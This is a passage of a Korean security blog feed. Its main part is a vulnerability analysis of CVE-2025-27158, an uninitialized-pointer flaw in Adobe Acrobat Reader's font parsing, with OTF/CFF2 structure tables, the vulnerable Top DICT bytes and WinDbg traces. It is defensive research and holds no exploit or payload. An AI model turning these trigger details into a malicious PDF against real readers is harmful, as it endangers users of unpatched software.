&#xC545;&#xC131; &#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xAC00;&#xC758; &#xB9AC;&#xBC84;&#xC2F1; &#xC774;&#xC57C;&#xAE30;(&#xC800;&#xC790; &#xC774;&#xC2B9;&#xC6D0;)</p><p><a href="https://m.blog.naver.com/choijo2/60196192627">https://m.blog.naver.com/choijo2/60196192627</a></p><p><a href="http://en.wikipedia.org/wiki/Obfuscation_(software">http://en.wikipedia.org/wiki/Obfuscation_(software)</a>)</p><p><a href="https://blog.quarkslab.com/dji-the-art-of-obfuscation.html">https://blog.quarkslab.com/dji-the-art-of-obfuscation.html</a></p><p><a href="https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/">https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/</a></p><p><a href="https://github.com/obfuscator-llvm/obfuscator">https://github.com/obfuscator-llvm/obfuscator</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/Anti-Debugging/">Anti-Debugging</category>
      
      <category domain="https://hackyboiz.github.io/tags/Debugging/">Debugging</category>
      
      <category domain="https://hackyboiz.github.io/tags/Malware/">Malware</category>
      
      <category domain="https://hackyboiz.github.io/tags/Reverse-Engineering/">Reverse Engineering</category>
      
      <category domain="https://hackyboiz.github.io/tags/OLLVM/">OLLVM</category>
      
      <category domain="https://hackyboiz.github.io/tags/Obfuscation/">Obfuscation</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/28/OUYA77/Anti_part3/kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-27158: Adobe Acrobat Reader의 Uninitialized Pointer로 인한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/04/23/ogu123/cve-2025-27158/</link>
      <guid>https://hackyboiz.github.io/2025/04/23/ogu123/cve-2025-27158/</guid>
      <pubDate>Wed, 23 Apr 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://talosintelligence.com/vulnerability_reports</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2025-2135">https://talosintelligence.com/vulnerability_reports/TALOS-2025-2135</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Adobe Acrobat Reader<ul><li>24.001.30225</li><li>20.005.30748</li><li>25.001.20428 &#xBC0F; &#xC774;&#xC804; &#xBC84;&#xC804;</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-27158&#xC740; Adobe Acrobat Reader&#xC5D0;&#xC11C; PDF&#xC5D0; &#xD3EC;&#xD568;&#xB41C; OTF(OpenType Font) &#xD30C;&#xC77C;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>OTF &#xD30C;&#xC77C;&#xC740; &#xD06C;&#xAC8C; TableDirectory&#xC640; TableRecords&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC5B4;, &#xBA3C;&#xC800; TableDirectory &#xAD6C;&#xC870;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">Offset Size   Name------ ----- --------------------------------------<span class="hljs-number">0x00</span>    <span class="hljs-number">0x04</span>  sfntVersion (<span class="hljs-number">0x00010000</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0x74727565</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0x4F54544F</span>  )<span class="hljs-number">0x04</span>    <span class="hljs-number">0x02</span>  numTables<span class="hljs-number">0x06</span>    <span class="hljs-number">0x02</span>  searchRange<span class="hljs-number">0x08</span>    <span class="hljs-number">0x02</span>  entrySelector<span class="hljs-number">0x0c</span>    <span class="hljs-number">0x02</span>  rangeShift</code></pre><p>sfntVersion &#xAC12;&#xC774; 0x00010000 &#xB610;&#xB294; 0x74727565&#xC778; &#xACBD;&#xC6B0; &#xAE00;&#xAF34;&#xC5D0; TrueType &#xB370;&#xC774;&#xD130;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xACE0;, 0x4F54544F&#xC778; &#xACBD;&#xC6B0; CFF &#xB370;&#xC774;&#xD130;&#xAC00; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;.</p><p>numTables&#xB294; TableRecord &#xAC1C;&#xC218;&#xB85C; TableRecord &#xAD6C;&#xC870;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">Offset Size   Name------ ----- ----------------------------------<span class="hljs-number">0x00</span>    <span class="hljs-number">0x04</span>  tableTag<span class="hljs-number">0x04</span>    <span class="hljs-number">0x04</span>  tableChecksum<span class="hljs-number">0x08</span>    <span class="hljs-number">0x04</span>  tableOffset<span class="hljs-number">0x0C</span>    <span class="hljs-number">0x04</span>  tableLength</code></pre><p>tableTag&#xC758; &#xAC12;&#xC774; &#x201C;CFF2&#x201D;&#xC774;&#xBA74; CFF2 &#xD14C;&#xC774;&#xBE14;&#xC744; &#xAC00;&#xB9AC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><p>CFF2(Compact Font Format version 2) &#xD14C;&#xC774;&#xBE14;&#xC758; &#xAD6C;&#xC870;&#xB294; &#xD5E4;&#xB354;, Top DICT, Global Subr INDEX, VariationStore&#xC73C;&#xB85C; &#xB418;&#xC5B4; &#xC788;&#xC5B4; &#xD5E4;&#xB354;&#xBD80;&#xD130; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">Offset Size   Name------ ----- --------------------------------------<span class="hljs-number">0x00</span>    <span class="hljs-number">0x01</span>  cff2MajorVersion<span class="hljs-number">0x01</span>    <span class="hljs-number">0x01</span>  cfff2MinorVersion<span class="hljs-number">0x02</span>    <span class="hljs-number">0x01</span>  cff2HeaderSize<span class="hljs-number">0x03</span>    <span class="hljs-number">0x02</span>  topDictLength</code></pre><p>&#xC5EC;&#xAE30;&#xC11C; topDictLength&#xB294; &#xB9D0; &#xADF8;&#xB300;&#xB85C; Top DICT &#xB370;&#xC774;&#xD130;&#xC758; &#xAE38;&#xC774;&#xB97C; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;.</p><p>Top DICT&#xB294; &#xD3F0;&#xD2B8;&#xC758; &#xC8FC;&#xC694; &#xC815;&#xBCF4;&#xB97C; &#xB2F4;&#xC740; &#xB370;&#xC774;&#xD130;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xB2E4;&#xC591;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">Operator Name   Operator Value    Operand type <span class="hljs-keyword">and</span> meaning----------------------------------------------------------------------------------------------------------CharStrings    <span class="hljs-number">0x11</span>               number <span class="hljs-keyword">and</span> it gives CharStrings INDEX offset, from start of the CFF2 table.vstore         <span class="hljs-number">0x18</span>               number <span class="hljs-keyword">and</span> it VariationStore structure offset, from start of the CFF2 table.FDArray        0x0C 0x24          number and it Font DICT (FD) INDEX offset, from start of the CFF2 table.FDSelect       <span class="hljs-number">0x0C</span> <span class="hljs-number">0x25</span>          number <span class="hljs-keyword">and</span> it CharStrings INDEX offset, from start of the CFF2 table. FontMatrix     <span class="hljs-number">0x0c</span> <span class="hljs-number">0x07</span>          <span class="hljs-function"><span class="hljs-built_in">array</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">default</span> value <span class="hljs-title">is</span> <span class="hljs-params">(<span class="hljs-number">0.001</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0.001</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>)</span></span></code></pre><p>&#xCDE8;&#xC57D;&#xD55C; OTF &#xD30C;&#xC77C;&#xC740; &#xC544;&#xB798; 3&#xAC1C;&#xC758; Top DICT &#xB370;&#xC774;&#xD130;&#xAC00; &#xC874;&#xC7AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-number">1</span>D <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">7</span>A <span class="hljs-number">0</span>C <span class="hljs-number">24</span>  ==&gt;  (<span class="hljs-keyword">operator</span>: FDArray, operand after encoding: <span class="hljs-number">0x7A</span>) <span class="hljs-number">1</span>D <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">8</span>A <span class="hljs-number">11</span>     ==&gt;  (<span class="hljs-keyword">operator</span>: CharStrings, operand after encoding: <span class="hljs-number">0x8A</span>)<span class="hljs-number">1</span>D <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">1</span>C <span class="hljs-number">18</span>     ==&gt;  (<span class="hljs-keyword">operator</span>: vstore, operand after encoding: <span class="hljs-number">0x1C</span>)</code></pre><p>&#xC774; &#xC911; vstore(0x18)&#xC758; offset&#xC740; 0x1C&#xB85C; CFF2 &#xD14C;&#xC774;&#xBE14;&#xC5D0;&#xC11C; 0x1C&#xB9CC;&#xD07C; &#xB5A8;&#xC5B4;&#xC9C4; &#xACF3;&#xC5D0; VariationStore&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xACE0; &#xAD6C;&#xC870;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"> Offset Size                       Name-----------------------------------------------------------------------<span class="hljs-number">0x00</span>    <span class="hljs-number">0x02</span>                       Length<span class="hljs-number">0x02</span>    <span class="hljs-number">0x02</span>                       Format<span class="hljs-number">0x04</span>    <span class="hljs-number">0x04</span>                       variationRegionListOffset<span class="hljs-number">0x06</span>    <span class="hljs-number">0x02</span>                       itemVariationDataCount (N)<span class="hljs-number">0x08</span>    <span class="hljs-number">0x04</span> * N                   itemVariationDataOffsets[N]</code></pre><p>itemVariationDataCount&#xB294; &#xD558;&#xC704; &#xD14C;&#xC774;&#xBE14;&#xC758; &#xAC1C;&#xC218;(N)&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xBA70; itemVariationDataOffsets&#xB294; &#xAC01; &#xD558;&#xC704; &#xD14C;&#xC774;&#xBE14;&#xC758; offset&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>itemVariationData&#xC758; &#xD558;&#xC704; &#xD14C;&#xC774;&#xBE14; &#xAD6C;&#xC870;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">Offset Size                       Name-----------------------------------------------------------------------<span class="hljs-number">0x00</span>    <span class="hljs-number">0x02</span>                      itemCount<span class="hljs-number">0x02</span>    <span class="hljs-number">0x02</span>                      shortDeltaCount<span class="hljs-number">0x04</span>    <span class="hljs-number">0x02</span>                      regionIndexCount (C)<span class="hljs-number">0x06</span>    <span class="hljs-number">0x02</span> * C                  regionIndexes[C]</code></pre><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; itemVariationDataCount&#xB97C; &#xD1B5;&#xD574; &#xD560;&#xB2F9;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC744; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC0AC;&#xC6A9;&#xD574; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">[...]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92AE:<span class="hljs-number">1</span>C21eax=<span class="hljs-number">00000010</span> ebx=f3a2a970 ecx=<span class="hljs-number">00000004</span> edx=<span class="hljs-number">00000100</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28da7 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000206</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5877</span>:<span class="hljs-number">6</span>ee28da7 e8b73ee6ff      call    CoolType!CTInit+<span class="hljs-number">0x195e3</span> (<span class="hljs-number">6</span>ec8cc63) &lt;- [<span class="hljs-number">1</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92AE:<span class="hljs-number">1</span>C3Beax=<span class="hljs-number">00000002</span> ebx=f3a2a970 ecx=<span class="hljs-number">00000002</span> edx=<span class="hljs-number">00000100</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28dac esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000202</span>CoolType!CTGetVersion+<span class="hljs-number">0xb587c</span>:<span class="hljs-number">6</span>ee28dac <span class="hljs-number">66898738020000</span>  mov     word ptr [edi+<span class="hljs-number">238</span>h],ax   ds:<span class="hljs-number">002b</span>:f3a2aba8=ffff &lt;- [<span class="hljs-number">2</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92AE:<span class="hljs-number">1</span>C3Ceax=<span class="hljs-number">00000002</span> ebx=f3a2a970 ecx=<span class="hljs-number">00000002</span> edx=<span class="hljs-number">00000100</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28db3 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000202</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5883</span>:<span class="hljs-number">6</span>ee28db3 <span class="hljs-number">0f</span>b7c0          movzx   eax,ax<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pallocate vuln buffer of size <span class="hljs-number">0x20</span>Time Travel Position: E92AE:<span class="hljs-number">1</span>C3Deax=<span class="hljs-number">00000002</span> ebx=f3a2a970 ecx=<span class="hljs-number">00000002</span> edx=<span class="hljs-number">00000100</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28db6 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000202</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5886</span>:<span class="hljs-number">6</span>ee28db6 c1e004          shl     eax,<span class="hljs-number">4</span>  &lt;- [<span class="hljs-number">3</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92AE:<span class="hljs-number">1</span>C3Eeax=<span class="hljs-number">00000020</span> ebx=f3a2a970 ecx=<span class="hljs-number">00000002</span> edx=<span class="hljs-number">00000100</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28db9 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000202</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5889</span>:<span class="hljs-number">6</span>ee28db9 <span class="hljs-number">50</span>              push    eax<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92AE:<span class="hljs-number">1</span>C3Feax=<span class="hljs-number">00000020</span> ebx=f3a2a970 ecx=<span class="hljs-number">00000002</span> edx=<span class="hljs-number">00000100</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28dba esp=<span class="hljs-number">052f</span>c4b0 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000202</span>CoolType!CTGetVersion+<span class="hljs-number">0xb588a</span>:<span class="hljs-number">6</span>ee28dba e817cee4ff      call    CoolType!CTInit+<span class="hljs-number">0x2556</span> (<span class="hljs-number">6</span>ec75bd6) &lt;- [<span class="hljs-number">4</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92B1:<span class="hljs-number">1394</span>eax=<span class="hljs-number">0</span>a02b330 ebx=f3a2a970 ecx=<span class="hljs-number">6</span>ec75bfe edx=<span class="hljs-number">00000000</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28dbf esp=<span class="hljs-number">052f</span>c4b0 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000206</span>CoolType!CTGetVersion+<span class="hljs-number">0xb588f</span>:<span class="hljs-number">6</span>ee28dbf <span class="hljs-number">89873</span>c020000    mov     dword ptr [edi+<span class="hljs-number">23</span>Ch],eax ds:<span class="hljs-number">002b</span>:f3a2abac=<span class="hljs-number">00000000</span>&lt;- [<span class="hljs-number">5</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; dd eax;                                  &lt;- [<span class="hljs-number">6</span>]<span class="hljs-number">0</span>a02b330  e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0<span class="hljs-number">0</span>a02b340  e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0<span class="hljs-number">0</span>a02b350  a0a0a0a0 a0a0a0a0 <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92B1:<span class="hljs-number">1395</span>eax=<span class="hljs-number">0</span>a02b330 ebx=f3a2a970 ecx=<span class="hljs-number">6</span>ec75bfe edx=<span class="hljs-number">00000000</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28dc5 esp=<span class="hljs-number">052f</span>c4b0 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000206</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5895</span>:<span class="hljs-number">6</span>ee28dc5 <span class="hljs-number">0f</span>b78738020000  movzx   eax,word ptr [edi+<span class="hljs-number">238</span>h]  ds:<span class="hljs-number">002b</span>:f3a2aba8=<span class="hljs-number">0002</span></code></pre><p>[1]&#xC5D0;&#xC11C; <code>CoolType!CTInit+0x195e3</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; VariationStore &#xAD6C;&#xC870;&#xCCB4; itemVariationDataCount &#xAC12;&#xC744; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;. [2]&#xC5D0;&#xC11C; itemVariationDataCount &#xAC12;(0x02)&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>[3]&#xC5D0;&#xC11C; itemVariationDataCount &#xAC12;&#xC744; &#xD1B5;&#xD574; &#xBC84;&#xD37C; &#xD06C;&#xAE30;(0x20)&#xB97C; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; [4]&#xC5D0;&#xC11C; <code>CoolType!CTInit+0x2556</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; malloc&#xC73C;&#xB85C; 0x20 &#xBC14;&#xC774;&#xD2B8; &#xD06C;&#xAE30;&#xC758; &#xBC84;&#xD37C;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>[6]&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xB41C; &#xBC84;&#xD37C;(0x0a02b330)&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74;, &#xB354;&#xBBF8; &#xB370;&#xC774;&#xD130;(0xe0e0e0e0)&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">[...]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; Time Travel Position: E92BA:<span class="hljs-number">1B</span>B5eax=db00d000 ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">0000016b</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e65 esp=<span class="hljs-number">052f</span>c4a8 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz ac po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000212</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5935</span>:<span class="hljs-number">6</span>ee28e65 e8f93de6ff      call    CoolType!CTInit+<span class="hljs-number">0x195e3</span> (<span class="hljs-number">6</span>ec8cc63) &lt;-[<span class="hljs-number">8</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1B</span>CFeax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e6a esp=<span class="hljs-number">052f</span>c4a8 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb593a</span>:<span class="hljs-number">6</span>ee28e6a <span class="hljs-number">57</span>              push    edi<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1B</span>D0eax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e6b esp=<span class="hljs-number">052f</span>c4a4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb593b</span>:<span class="hljs-number">6</span>ee28e6b <span class="hljs-number">668906</span>          mov     word ptr [esi],ax        ds:<span class="hljs-number">002b</span>:<span class="hljs-number">0</span>a02b330=e0e0 &lt;-[<span class="hljs-number">9</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pBreakpoint <span class="hljs-number">1</span> hitTime Travel Position: E92BA:<span class="hljs-number">1B</span>D1eax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e6e esp=<span class="hljs-number">052f</span>c4a4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb593e</span>:<span class="hljs-number">6</span>ee28e6e e8f03de6ff      call    CoolType!CTInit+<span class="hljs-number">0x195e3</span> (<span class="hljs-number">6</span>ec8cc63) &lt;-[<span class="hljs-number">10</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; db esi L20<span class="hljs-number">0</span>a02b330  <span class="hljs-number">00</span> <span class="hljs-number">00</span> e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................<span class="hljs-number">0</span>a02b340  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1B</span>EBeax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e73 esp=<span class="hljs-number">052f</span>c4a4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5943</span>:<span class="hljs-number">6</span>ee28e73 <span class="hljs-number">57</span>              push    edi<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1B</span>ECeax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e74 esp=<span class="hljs-number">052f</span>c4a0 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5944</span>:<span class="hljs-number">6</span>ee28e74 <span class="hljs-number">66894602</span>        mov     word ptr [esi+<span class="hljs-number">2</span>],ax      ds:<span class="hljs-number">002b</span>:<span class="hljs-number">0</span>a02b332=e0e0 &lt;-[<span class="hljs-number">11</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pBreakpoint <span 